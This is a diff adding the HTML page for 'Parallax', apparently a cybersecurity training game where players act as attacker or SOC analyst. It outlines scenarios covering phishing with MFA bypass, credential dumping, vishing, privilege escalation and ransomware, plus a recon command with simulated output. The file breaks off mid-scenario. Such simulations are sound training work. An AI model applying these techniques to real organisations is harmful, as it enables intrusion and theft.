@@ -1,0 +1,1535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Parallax — The other side of every breach</title>
+<meta name="description" content="Play both sides of a cyberattack. Real tools, real techniques, real understanding. 6 scenarios from OSINT to Ransomware."/>
+<meta name="keywords" content="cybersecurity training, ethical hacking, SOC analyst, red team, blue team, security simulation"/>
+<meta name="author" content="Sarath G"/>
+<meta property="og:title" content="Parallax — The other side of every breach"/>
+<meta property="og:description" content="Same breach. Two positions. Everything changes. Play attacker then defender across 6 real-world cybersecurity scenarios."/>
+<meta property="og:image" content="https://parallax.sarathg.me/og-image.png"/>
+<meta property="og:url" content="https://parallax.sarathg.me"/>
+<meta property="og:type" content="website"/>
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:title" content="Parallax — Cybersecurity Dual POV Simulation"/>
+<meta name="twitter:description" content="Same breach. Two positions. Everything changes."/>
+<meta name="twitter:image" content="https://parallax.sarathg.me/og-image.png"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<link rel="canonical" href="https://parallax.sarathg.me"/>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NEDPJLR3D3"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-NEDPJLR3D3');</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#0f1117;--surface:#1a1d27;--surface2:#21242f;--border:#2a2d3a;--border2:#363a4a;
+  --text:#e2e4ed;--text2:#8b90a0;--text3:#555a6e;
+  --red:#f1645a;--red-bg:#2a1518;--red-light:#3d1e20;
+  --blue:#4d9fff;--blue-bg:#0f1e33;--blue-light:#162840;
+  --green:#3ecf8e;--green-bg:#0d2420;--green-light:#133028;
+  --amber:#f5a623;--amber-bg:#251d0e;--amber-light:#332610;
+  --purple:#a78bfa;--purple-bg:#1a1530;--purple-light:#221d3a;
+  --radius:10px;--radius-lg:14px;
+  --shadow:0 1px 3px rgba(0,0,0,.3),0 1px 2px rgba(0,0,0,.2);
+  --shadow-md:0 4px 16px rgba(0,0,0,.4),0 2px 6px rgba(0,0,0,.3);
+}
+body{background:var(--bg);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:var(--text);overflow:hidden;font-size:15px;line-height:1.5;}
+
+/* ── LOADING SCREEN ── */
+#s-loading{position:fixed;inset:0;background:#0f1117;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:999;transition:opacity .6s;}
+#s-loading.fade-out{opacity:0;pointer-events:none;}
+.load-logo{font-size:42px;font-weight:800;letter-spacing:-2px;color:var(--text);margin-bottom:6px;}
+.load-tag{font-size:12px;letter-spacing:3px;color:var(--text3);margin-bottom:40px;text-transform:uppercase;}
+.load-bar-wrap{width:200px;height:2px;background:var(--border);border-radius:2px;overflow:hidden;}
+.load-bar{height:100%;width:0%;background:linear-gradient(90deg,var(--blue),var(--purple));border-radius:2px;transition:width .08s linear;}
+.load-status{font-size:11px;color:var(--text3);margin-top:12px;letter-spacing:1px;}
+
+/* ── MOBILE ── */
+@media(max-width:768px){
+  .intro-hero h1{font-size:36px;}
+  .intro-hero p{font-size:14px;}
+  .intro-pills{display:none;}
+  .scenario-grid{grid-template-columns:1fr;}
+  .intro-footer{flex-wrap:wrap;gap:12px;padding:16px;}
+  .role-grid{grid-template-columns:1fr;}
+  #game-body{flex-direction:column;}
+  #info-panel{width:100%;max-height:50vh;border-right:none;border-top:1px solid var(--border);}
+  #term-panel{min-height:280px;}
+  #game-topbar{flex-wrap:wrap;gap:8px;padding:8px 12px;}
+  .db-grid{grid-template-columns:1fr;}
+  .db-score-row{flex-wrap:wrap;}
+  .db-btns{flex-direction:column;width:100%;max-width:400px;}
+  .btn-primary,.btn-secondary{width:100%;text-align:center;}
+  #s-debrief{padding:20px 16px;}
+  .intro-body{padding:24px 16px;}
+  .intro-nav{padding:12px 16px;}
+  .intro-hero{padding:40px 20px 32px;}
+}
+@media(max-width:480px){
+  .role-card{padding:18px 14px;}
+  .topbar-scenario{display:none;}
+  #term-body{font-size:11px;}
+  #info-scroll{padding:12px;}
+}
+
+/* ── SHARE CARD OVERLAY ── */
+#share-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:100;display:none;align-items:center;justify-content:center;padding:24px;}
+#share-overlay.active{display:flex;}
+#share-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);padding:28px;max-width:420px;width:100%;text-align:center;}
+#share-card h3{font-size:18px;font-weight:700;color:var(--text);margin-bottom:4px;}
+#share-card p{font-size:13px;color:var(--text2);margin-bottom:20px;}
+.share-score-big{font-size:48px;font-weight:800;color:var(--blue);line-height:1;margin-bottom:4px;}
+.share-score-label{font-size:11px;letter-spacing:2px;color:var(--text3);text-transform:uppercase;margin-bottom:16px;}
+.share-stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px;}
+.share-stat{background:var(--surface2);border-radius:8px;padding:10px 6px;}
+.share-stat-v{font-size:18px;font-weight:700;color:var(--text);}
+.share-stat-l{font-size:10px;color:var(--text3);margin-top:2px;}
+.share-url{font-size:12px;color:var(--blue);background:var(--blue-bg);border:1px solid var(--blue-light);padding:8px 12px;border-radius:6px;margin-bottom:16px;word-break:break-all;}
+.share-btns{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;}
+.share-btn{padding:9px 16px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;border:none;transition:all .15s;}
+.share-btn.copy{background:var(--blue);color:#fff;}
+.share-btn.copy:hover{opacity:.85;}
+.share-btn.close-share{background:var(--surface2);color:var(--text2);border:1px solid var(--border);}
+.share-btn.close-share:hover{border-color:var(--border2);color:var(--text);}
+
+/* ── CERTIFICATE OVERLAY ── */
+#cert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:100;display:none;align-items:center;justify-content:center;padding:24px;}
+#cert-overlay.active{display:flex;flex-direction:column;gap:12px;}
+#cert-canvas{border-radius:var(--radius-lg);box-shadow:0 20px 60px rgba(0,0,0,.5);}
+.cert-btns{display:flex;gap:10px;}
+
+
+.screen{position:fixed;inset:0;display:none;overflow-y:auto;}
+.screen.active{display:flex;flex-direction:column;}
+
+/* ── INTRO ── */
+#s-intro{align-items:center;justify-content:flex-start;padding:0;background:var(--bg);}
+.intro-nav{width:100%;padding:16px 40px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border);background:var(--surface);}
+.intro-nav-logo{font-size:15px;font-weight:700;letter-spacing:2px;color:var(--text);}
+.intro-nav-tag{font-size:12px;color:var(--text3);background:var(--surface2);border:1px solid var(--border);padding:4px 12px;border-radius:20px;}
+.intro-hero{width:100%;padding:64px 40px 48px;text-align:center;background:var(--surface);border-bottom:1px solid var(--border);position:relative;overflow:hidden;}
+.intro-hero::before{content:'';position:absolute;inset:0;background-image:radial-gradient(var(--border) 1px,transparent 1px);background-size:28px 28px;opacity:0.5;pointer-events:none;}
+.intro-hero-inner{position:relative;z-index:1;}
+.intro-eyebrow{display:inline-block;font-size:11px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:var(--blue);background:var(--blue-bg);border:1px solid var(--blue-light);padding:5px 14px;border-radius:20px;margin-bottom:20px;}
+.intro-hero h1{font-size:clamp(40px,7vw,72px);font-weight:800;letter-spacing:-2px;color:var(--text);margin-bottom:14px;line-height:1;}
+.intro-hero p{font-size:17px;color:var(--text2);max-width:480px;margin:0 auto 28px;line-height:1.6;}
+.intro-pills{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;}
+.intro-pill{font-size:12px;color:var(--text2);background:var(--surface2);border:1px solid var(--border);padding:5px 14px;border-radius:20px;display:flex;align-items:center;gap:5px;}
+.intro-pill span{font-size:13px;}
+.intro-body{width:100%;max-width:900px;padding:40px 24px;align-self:center;}
+.intro-section-label{font-size:11px;font-weight:700;letter-spacing:3px;text-transform:uppercase;color:var(--text3);margin-bottom:16px;}
+.scenario-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:14px;width:100%;margin-bottom:32px;}
+.sc-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);padding:0;cursor:pointer;transition:all .18s;text-align:left;overflow:hidden;}
+.sc-card:hover{border-color:var(--border2);box-shadow:var(--shadow-md);transform:translateY(-2px);}
+.sc-card-top{padding:18px 18px 14px;border-bottom:1px solid var(--border);}
+.sc-card-bottom{padding:12px 18px;display:flex;align-items:center;justify-content:space-between;background:var(--surface2);}
+.sc-icon{font-size:24px;margin-bottom:10px;display:block;}
+.sc-name{font-size:14px;font-weight:600;color:var(--text);margin-bottom:5px;}
+.sc-desc{font-size:12px;color:var(--text3);line-height:1.5;}
+.sc-diff{font-size:11px;font-weight:600;}
+.diff-1{color:var(--green);}
+.diff-2{color:var(--amber);}
+.diff-3{color:var(--red);}
+.sc-tools{display:flex;gap:5px;flex-wrap:wrap;}
+.sc-tool{font-size:10px;color:var(--text3);background:var(--surface);border:1px solid var(--border);padding:2px 7px;border-radius:4px;}
+.intro-footer{width:100%;padding:20px 40px;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:center;gap:24px;background:var(--surface);}
+.intro-footer-item{font-size:12px;color:var(--text3);display:flex;align-items:center;gap:6px;}
+.intro-footer-item strong{color:var(--text2);}
+
+/* ── ROLE SELECT ── */
+#s-role{align-items:center;justify-content:center;padding:32px 24px;}
+.role-back{align-self:flex-start;background:none;border:none;color:var(--text2);font-size:14px;cursor:pointer;padding:0 0 20px;display:flex;align-items:center;gap:6px;}
+.role-back:hover{color:var(--text);}
+.role-heading{text-align:center;margin-bottom:28px;}
+.role-heading h2{font-size:22px;font-weight:700;letter-spacing:-0.3px;margin-bottom:4px;}
+.role-heading p{font-size:14px;color:var(--text2);}
+.role-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;max-width:680px;width:100%;}
+.role-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--radius-lg);padding:24px 20px;cursor:pointer;transition:all .15s;position:relative;overflow:hidden;}
+.role-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;}
+.role-card.attacker::before{background:var(--red);}
+.role-card.defender::before{background:var(--blue);}
+.role-card:hover{box-shadow:var(--shadow-md);transform:translateY(-2px);}
+.role-card.attacker:hover{border-color:#fca5a5;}
+.role-card.defender:hover{border-color:#93c5fd;}
+.role-avatar{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;margin-bottom:14px;}
+.role-card.attacker .role-avatar{background:var(--red-light);}
+.role-card.defender .role-avatar{background:var(--blue-light);}
+.role-title{font-size:17px;font-weight:700;margin-bottom:6px;}
+.role-card.attacker .role-title{color:var(--red);}
+.role-card.defender .role-title{color:var(--blue);}
+.role-desc{font-size:13px;color:var(--text2);line-height:1.6;margin-bottom:14px;}
+.tool-list{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:14px;}
+.tool-chip{font-size:11px;padding:3px 8px;border-radius:20px;font-weight:500;}
+.attacker .tool-chip{background:var(--red-bg);color:var(--red);}
+.defender .tool-chip{background:var(--blue-bg);color:var(--blue);}
+.role-badge{display:inline-block;font-size:11px;font-weight:600;padding:4px 10px;border-radius:20px;}
+.attacker .role-badge{background:var(--red-light);color:var(--red);}
+.defender .role-badge{background:var(--blue-light);color:var(--blue);}
+
+/* ── GAME ── */
+#s-game{flex-direction:column;background:var(--bg);}
+#game-topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;}
+.topbar-left{display:flex;align-items:center;gap:12px;}
+.topbar-back{background:none;border:1px solid var(--border);border-radius:7px;padding:5px 11px;font-size:13px;color:var(--text2);cursor:pointer;display:flex;align-items:center;gap:5px;}
+.topbar-back:hover{border-color:var(--border2);color:var(--text);}
+.topbar-scenario{font-size:14px;font-weight:600;color:var(--text);}
+.topbar-role-badge{font-size:11px;font-weight:600;padding:4px 10px;border-radius:20px;}
+.topbar-role-badge.attacker{background:var(--red-bg);color:var(--red);border:1px solid var(--red-light);}
+.topbar-role-badge.defender{background:var(--blue-bg);color:var(--blue);border:1px solid var(--blue-light);}
+.topbar-right{display:flex;align-items:center;gap:16px;}
+.prog-wrap{display:flex;gap:5px;align-items:center;}
+.prog-dot{width:8px;height:8px;border-radius:50%;background:var(--surface2);border:1.5px solid var(--border);}
+.prog-dot.done{background:var(--green);border-color:var(--green);}
+.prog-dot.active{background:var(--amber);border-color:var(--amber);}
+.score-chip{font-size:13px;font-weight:600;color:var(--amber);background:var(--amber-bg);border:1px solid var(--amber-light);padding:4px 10px;border-radius:20px;}
+
+#game-body{display:flex;flex:1;overflow:hidden;min-height:0;}
+
+/* Terminal */
+#term-panel{flex:1;display:flex;flex-direction:column;border-right:1px solid var(--border);background:#1e1e2e;min-width:0;}
+#term-topbar{padding:10px 16px;border-bottom:1px solid rgba(255,255,255,.08);display:flex;align-items:center;gap:7px;background:#181825;flex-shrink:0;}
+.term-btn{width:12px;height:12px;border-radius:50%;}
+#term-title{font-size:12px;color:rgba(255,255,255,.3);font-family:'SF Mono','Fira Code',monospace;margin-left:4px;}
+#term-body{flex:1;overflow-y:auto;padding:16px;font-family:'SF Mono','Fira Code','Consolas',monospace;font-size:13px;line-height:1.75;}
+#term-body::-webkit-scrollbar{width:5px;}
+#term-body::-webkit-scrollbar-thumb{background:#313244;border-radius:3px;}
+.tl{margin-bottom:1px;white-space:pre-wrap;word-break:break-all;}
+.tl-prompt{color:#a6e3a1;}
+.tl-prompt.red{color:#f38ba8;}
+.tl-cmd{color:#cdd6f4;}
+.tl-out{color:#6c7086;}
+.tl-success{color:#a6e3a1;}
+.tl-warn{color:#f9e2af;}
+.tl-error{color:#f38ba8;}
+.tl-data{color:#89b4fa;}
+.tl-cursor{display:inline-block;width:8px;height:15px;background:#a6e3a1;vertical-align:middle;animation:blink .8s infinite;}
+.tl-cursor.red{background:#f38ba8;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+
+/* Info panel */
+#info-panel{width:360px;flex-shrink:0;display:flex;flex-direction:column;overflow:hidden;background:var(--surface);}
+#info-scroll{flex:1;overflow-y:auto;padding:16px;}
+#info-scroll::-webkit-scrollbar{width:5px;}
+#info-scroll::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+.info-section{margin-bottom:16px;}
+.info-section-label{font-size:11px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;color:var(--text3);margin-bottom:6px;}
+.info-card{background:var(--surface2);border-radius:var(--radius);padding:12px 14px;font-size:13px;color:var(--text2);line-height:1.65;}
+.why-card{background:var(--amber-bg);border:1px solid var(--amber-light);border-radius:var(--radius);padding:12px 14px;font-size:13px;color:#92400e;line-height:1.65;}
+.step-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
+.step-title{font-size:16px;font-weight:700;color:var(--text);}
+.tool-badge{font-size:11px;font-weight:600;padding:4px 10px;border-radius:20px;background:var(--purple-bg);color:var(--purple);border:1px solid var(--purple-light);}
+.choices-wrap{display:flex;flex-direction:column;gap:7px;margin-top:12px;}
+.choice-btn{padding:11px 14px;border-radius:var(--radius);font-size:13px;cursor:pointer;text-align:left;border:1.5px solid var(--border);background:var(--surface);color:var(--text);transition:all .15s;font-family:inherit;line-height:1.4;}
+.choice-btn:hover:not(:disabled){border-color:var(--border2);background:var(--surface2);}
+.choice-btn.attacker-btn:hover:not(:disabled){border-color:#fca5a5;background:var(--red-bg);}
+.choice-btn.defender-btn:hover:not(:disabled){border-color:#93c5fd;background:var(--blue-bg);}
+.choice-btn.correct{background:var(--green-bg)!important;border-color:#86efac!important;color:var(--green)!important;}
+.choice-btn.wrong{background:var(--red-bg)!important;border-color:#fca5a5!important;color:var(--red)!important;}
+.choice-btn:disabled{cursor:default;}
+.feedback-card{margin-top:10px;padding:12px 14px;border-radius:var(--radius);font-size:13px;line-height:1.65;display:none;}
+.fb-correct{background:var(--green-bg);border:1px solid #86efac;color:#166534;}
+.fb-wrong{background:var(--red-bg);border:1px solid #fca5a5;color:#991b1b;}
+.next-btn{margin-top:12px;padding:10px 18px;border-radius:var(--radius);font-size:14px;font-weight:600;cursor:pointer;border:none;display:none;transition:all .15s;width:100%;}
+.next-btn.attacker-next{background:var(--red);color:#fff;}
+.next-btn.attacker-next:hover{background:#b91c1c;}
+.next-btn.defender-next{background:var(--blue);color:#fff;}
+.next-btn.defender-next:hover{background:#1d4ed8;}
+
+/* ── DEBRIEF ── */
+#s-debrief{align-items:center;padding:32px 24px;}
+.db-header{text-align:center;margin-bottom:24px;}
+.db-header h2{font-size:24px;font-weight:700;letter-spacing:-0.3px;margin-bottom:4px;}
+.db-header p{font-size:14px;color:var(--text2);}
+.db-score-row{display:flex;gap:10px;margin-bottom:20px;}
+.db-stat{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:14px 20px;text-align:center;min-width:90px;}
+.db-stat-v{font-size:22px;font-weight:700;color:var(--text);}
+.db-stat-l{font-size:11px;color:var(--text3);margin-top:2px;text-transform:uppercase;letter-spacing:.5px;}
+.db-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;max-width:800px;width:100%;margin-bottom:16px;}
+.db-col{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);padding:16px;}
+.db-col-title{font-size:13px;font-weight:600;margin-bottom:12px;display:flex;align-items:center;gap:7px;}
+.db-col.atk .db-col-title{color:var(--red);}
+.db-col.def .db-col-title{color:var(--blue);}
+.db-step{padding:10px 12px;border-radius:8px;margin-bottom:7px;}
+.db-step.atk{background:var(--red-bg);border-left:3px solid var(--red);}
+.db-step.def{background:var(--blue-bg);border-left:3px solid var(--blue);}
+.db-step-name{font-size:12px;font-weight:600;margin-bottom:2px;}
+.db-step.atk .db-step-name{color:var(--red);}
+.db-step.def .db-step-name{color:var(--blue);}
+.db-step-tool{font-size:11px;color:var(--text3);font-family:'SF Mono',monospace;margin-bottom:3px;}
+.db-step-desc{font-size:12px;color:var(--text2);line-height:1.5;}
+.lessons-card{max-width:800px;width:100%;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);padding:16px;margin-bottom:20px;}
+.lessons-title{font-size:13px;font-weight:600;color:var(--text);margin-bottom:10px;display:flex;align-items:center;gap:6px;}
+.lesson-item{font-size:13px;color:var(--text2);padding:8px 0;border-bottom:1px solid var(--border);line-height:1.55;display:flex;align-items:flex-start;gap:8px;}
+.lesson-item:last-child{border-bottom:none;}
+.lesson-dot{width:6px;height:6px;border-radius:50%;background:var(--amber);margin-top:7px;flex-shrink:0;}
+.db-btns{display:flex;gap:10px;flex-wrap:wrap;justify-content:center;}
+.btn-primary{padding:11px 24px;border-radius:var(--radius);font-size:14px;font-weight:600;cursor:pointer;border:none;background:var(--text);color:#fff;transition:all .15s;}
+.btn-primary:hover{opacity:.85;}
+.btn-secondary{padding:11px 24px;border-radius:var(--radius);font-size:14px;font-weight:600;cursor:pointer;border:1.5px solid var(--border);background:var(--surface);color:var(--text2);transition:all .15s;}
+.btn-secondary:hover{border-color:var(--border2);color:var(--text);}
+
+/* Responsive */
+@media(max-width:680px){
+  .role-grid,.db-grid{grid-template-columns:1fr;}
+  #info-panel{display:none;}
+  #term-panel{flex:1;}
+}
+</style>
+</head>
+<body>
+
+<!-- LOADING -->
+<div id="s-loading">
+  <div class="load-logo">PARALLAX</div>
+  <div class="load-tag">Cybersecurity Simulation</div>
+  <div class="load-bar-wrap"><div class="load-bar" id="load-bar"></div></div>
+  <div class="load-status" id="load-status">Initialising...</div>
+</div>
+
+<!-- SHARE OVERLAY -->
+<div id="share-overlay">
+  <div id="share-card">
+    <h3>Share your result</h3>
+    <p>Challenge your colleagues to beat your score</p>
+    <div class="share-score-big" id="sh-score">0</div>
+    <div class="share-score-label">points scored</div>
+    <div class="share-stats">
+      <div class="share-stat"><div class="share-stat-v" id="sh-scenarios">0</div><div class="share-stat-l">Scenarios</div></div>
+      <div class="share-stat"><div class="share-stat-v" id="sh-correct">0</div><div class="share-stat-l">Correct</div></div>
+      <div class="share-stat"><div class="share-stat-v" id="sh-acc">0%</div><div class="share-stat-l">Accuracy</div></div>
+    </div>
+    <div class="share-url">parallax.sarathg.me — Same breach. Two positions. Everything changes.</div>
+    <div class="share-btns">
+      <button class="share-btn copy" onclick="copyShareLink()">Copy link</button>
+      <button class="share-btn copy" style="background:var(--green)" onclick="shareTwitter()">Share on X</button>
+      <button class="share-btn close-share" onclick="closeShare()">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- CERTIFICATE OVERLAY -->
+<div id="cert-overlay">
+  <canvas id="cert-canvas" width="800" height="560"></canvas>
+  <div class="cert-btns">
+    <button class="share-btn copy" onclick="downloadCert()">Download certificate</button>
+    <button class="share-btn close-share" onclick="closeCert()">Close</button>
+  </div>
+</div>
+
+
+<div id="s-intro" class="screen active">
+  <nav class="intro-nav">
+    <div class="intro-nav-logo">⬡ PARALLAX</div>
+    <div class="intro-nav-tag">Cybersecurity Training Simulation</div>
+  </nav>
+  <div class="intro-hero">
+    <div class="intro-hero-inner">
+      <div class="intro-eyebrow">Dual POV Simulation</div>
+      <h1>PARALLAX</h1>
+      <p>Same breach. Two positions. Everything changes.</p>
+      <div class="intro-pills">
+        <div class="intro-pill"><span>🦹</span> Play the attacker</div>
+        <div class="intro-pill"><span>🧑‍💻</span> Play the defender</div>
+        <div class="intro-pill"><span>⚡</span> Real tools & commands</div>
+        <div class="intro-pill"><span>📖</span> Learn both sides</div>
+      </div>
+    </div>
+  </div>
+  <div class="intro-body">
+    <div class="intro-section-label">Choose a scenario</div>
+    <div class="scenario-grid">
+      <div class="sc-card" onclick="selectScenario(0)">
+        <div class="sc-card-top">
+          <span class="sc-icon">🔍</span>
+          <div class="sc-name">OSINT Reconnaissance</div>
+          <div class="sc-desc">Harvest emails, scan Shodan, map the attack surface before a single packet is sent.</div>
+        </div>
+        <div class="sc-card-bottom">
+          <span class="sc-diff diff-1">★☆☆ Beginner</span>
+          <div class="sc-tools"><span class="sc-tool">theHarvester</span><span class="sc-tool">Shodan</span><span class="sc-tool">Maltego</span></div>
+        </div>
+      </div>
+      <div class="sc-card" onclick="selectScenario(1)">
+        <div class="sc-card-top">
+          <span class="sc-icon">🎣</span>
+          <div class="sc-name">Phishing Campaign</div>
+          <div class="sc-desc">Clone login pages, bypass MFA with evilginx2, and establish OAuth persistence.</div>
+        </div>
+        <div class="sc-card-bottom">
+          <span class="sc-diff diff-1">★☆☆ Beginner</span>
+          <div class="sc-tools"><span class="sc-tool">evilginx2</span><span class="sc-tool">GoPhish</span><span class="sc-tool">SET</span></div>
+        </div>
+      </div>
+      <div class="sc-card" onclick="selectScenario(2)">
+        <div class="sc-card-top">
+          <span class="sc-icon">🌐</span>
+          <div class="sc-name">Network Intrusion</div>
+          <div class="sc-desc">Exploit CVEs with Metasploit, dump credentials, move laterally to the Domain Controller.</div>
+        </div>
+        <div class="sc-card-bottom">
+          <span class="sc-diff diff-2">★★☆ Intermediate</span>
+          <div class="sc-tools"><span class="sc-tool">nmap</span><span class="sc-tool">Metasploit</span><span class="sc-tool">Mimikatz</span></div>
+        </div>
+      </div>
+      <div class="sc-card" onclick="selectScenario(3)">
+        <div class="sc-card-top">
+          <span class="sc-icon">🎭</span>
+          <div class="sc-name">Social Engineering</div>
+          <div class="sc-desc">Spoof caller ID, impersonate vendors, and extract VPN credentials from helpdesk staff.</div>
+        </div>
+        <div class="sc-card-bottom">
+          <span class="sc-diff diff-2">★★☆ Intermediate</span>
+          <div class="sc-tools"><span class="sc-tool">SpoofCard</span><span class="sc-tool">Vishing</span><span class="sc-tool">Pretexting</span></div>
+        </div>
+      </div>
+      <div class="sc-card" onclick="selectScenario(4)">
+        <div class="sc-card-top">
+          <span class="sc-icon">⬆️</span>
+          <div class="sc-name">Privilege Escalation</div>
+          <div class="sc-desc">Exploit sudo misconfigs, abuse AD ACLs with BloodHound, escalate to Domain Admin.</div>
+        </div>
+        <div class="sc-card-bottom">
+          <span class="sc-diff diff-3">★★★ Advanced</span>
+          <div class="sc-tools"><span class="sc-tool">LinPEAS</span><span class="sc-tool">BloodHound</span><span class="sc-tool">PowerView</span></div>
+        </div>
+      </div>
+      <div class="sc-card" onclick="selectScenario(5)">
+        <div class="sc-card-top">
+          <span class="sc-icon">💀</span>
+          <div class="sc-name">Ransomware Deployment</div>
+          <div class="sc-desc">Disable EDR via GPO, corrupt backups, encrypt 134 systems, demand $2.4M ransom.</div>
+        </div>
+        <div class="sc-card-bottom">
+          <span class="sc-diff diff-3">★★★ Advanced</span>
+          <div class="sc-tools"><span class="sc-tool">Cobalt Strike</span><span class="sc-tool">PsExec</span><span class="sc-tool">C2</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <footer class="intro-footer">
+    <div class="intro-footer-item"><strong>6</strong> scenarios</div>
+    <div class="intro-footer-item"><strong>48</strong> real-world techniques</div>
+    <div class="intro-footer-item"><strong>2</strong> roles per scenario</div>
+    <div class="intro-footer-item"><strong>100%</strong> browser-based</div>
+  </footer>
+</div>
+
+<!-- ROLE SELECT -->
+<div id="s-role" class="screen">
+  <button class="role-back" onclick="show('s-intro')">← Back to scenarios</button>
+  <div class="role-heading">
+    <h2 id="role-scenario-title">OSINT Reconnaissance</h2>
+    <p>Choose your starting role</p>
+  </div>
+  <div class="role-grid">
+    <div class="role-card attacker" onclick="startRole('hacker')">
+      <div class="role-avatar">🦹</div>
+      <div class="role-title">Attacker</div>
+      <div class="role-desc">Execute the attack step by step using real tools and techniques. Learn how breaches actually happen.</div>
+      <div class="tool-list attacker" id="hacker-tools"></div>
+      <span class="role-badge">Go first</span>
+    </div>
+    <div class="role-card defender" onclick="startRole('soc')">
+      <div class="role-avatar">🧑‍💻</div>
+      <div class="role-title">SOC Analyst</div>
+      <div class="role-desc">Detect, investigate and contain the attack using real defensive tools and incident response procedures.</div>
+      <div class="tool-list defender" id="soc-tools"></div>
+      <span class="role-badge">Go second</span>
+    </div>
+  </div>
+</div>
+
+<!-- GAME -->
+<div id="s-game" class="screen">
+  <div id="game-topbar">
+    <div class="topbar-left">
+      <button class="topbar-back" onclick="show('s-role')">← Exit</button>
+      <span id="topbar-scenario" class="topbar-scenario"></span>
+      <span id="topbar-role" class="topbar-role-badge attacker"></span>
+    </div>
+    <div class="topbar-right">
+      <div class="prog-wrap" id="prog-wrap"></div>
+      <div class="score-chip">Score: <span id="g-score">0</span></div>
+    </div>
+  </div>
+  <div id="game-body">
+    <div id="term-panel">
+      <div id="term-topbar">
+        <div class="term-btn" style="background:#ff5f57;"></div>
+        <div class="term-btn" style="background:#febc2e;"></div>
+        <div class="term-btn" style="background:#28c840;"></div>
+        <span id="term-title">terminal</span>
+      </div>
+      <div id="term-body"><span class="tl-cursor"></span></div>
+    </div>
+    <div id="info-panel">
+      <div id="info-scroll"></div>
+    </div>
+  </div>
+</div>
+
+<!-- DEBRIEF -->
+<div id="s-debrief" class="screen">
+  <div class="debrief-title">Scenario debrief</div>
+  <div class="debrief-sub" id="db-scenario-name"></div>
+  <div class="db-score-row">
+    <div class="db-stat"><div class="db-stat-v" id="db-score">0</div><div class="db-stat-l">Score</div></div>
+    <div class="db-stat"><div class="db-stat-v" id="db-correct">0</div><div class="db-stat-l">Correct</div></div>
+    <div class="db-stat"><div class="db-stat-v" id="db-acc" style="color:var(--amber)">0%</div><div class="db-stat-l">Accuracy</div></div>
+  </div>
+  <div class="db-grid">
+    <div class="db-col atk">
+      <div class="db-col-title"><span>🦹</span> Attack chain</div>
+      <div id="db-atk"></div>
+    </div>
+    <div class="db-col def">
+      <div class="db-col-title"><span>🧑‍💻</span> Defence chain</div>
+      <div id="db-def"></div>
+    </div>
+  </div>
+  <div class="lessons-card">
+    <div class="lessons-title">⚡ Key lessons</div>
+    <div id="db-lessons"></div>
+  </div>
+  <div class="db-btns">
+    <button class="btn-primary" id="db-other-btn" onclick="playOtherSide()">Play defender side →</button>
+    <button class="btn-secondary" onclick="show('s-intro')">Choose another scenario</button>
+  </div>
+</div>
+
+<script>
+const SCENARIOS=[
+{
+  id:0,name:"OSINT Reconnaissance",icon:"🔍",
+  hackerTools:["theHarvester","Maltego","Shodan","OSINT Framework"],
+  socTools:["Shodan Monitor","GitGuardian","Attack Surface Mgmt"],
+  hacker:{
+    prompt:"attacker@kali:~$",
+    intro:["[*] Target: Acme Corp (acmecorp.com)","[*] Objective: Gather intelligence before attack","[*] Phase: Pre-exploitation / Reconnaissance",""],
+    steps:[
+      {name:"Email harvesting",tool:"theHarvester",
+       cmd:"theharvester -d acmecorp.com -l 200 -b google,linkedin,hunter",
+       output:["[*] Searching Google...","[+] Emails found:","    j.smith@acmecorp.com (IT Manager)","    ceo@acmecorp.com","    helpdesk@acmecorp.com","[+] Hosts found:","    vpn.acmecorp.com","    mail.acmecorp.com — 104.21.44.12","[+] 3 LinkedIn profiles matched"],
+       desc:"theHarvester scrapes search engines, LinkedIn, and DNS to find emails, subdomains and employee names — entirely from public sources.",
+       why:"Email addresses are the primary attack surface for phishing. Subdomains expose hidden services. Employee names reveal organisational structure.",
+       choices:[
+         {t:"theharvester -d acmecorp.com -b all -l 500",c:true,explain:"Correct — '-b all' searches every available source. More coverage equals more attack surface discovered."},
+         {t:"nmap -sV acmecorp.com",c:false,explain:"nmap is for port scanning, not email harvesting. Wrong tool for this phase of the attack."},
+         {t:"theHarvester -d acmecorp.com -b bing",c:false,explain:"Bing only is too narrow. Use all available sources for comprehensive recon."},
+       ]},
+      {name:"Shodan scan",tool:"Shodan CLI",
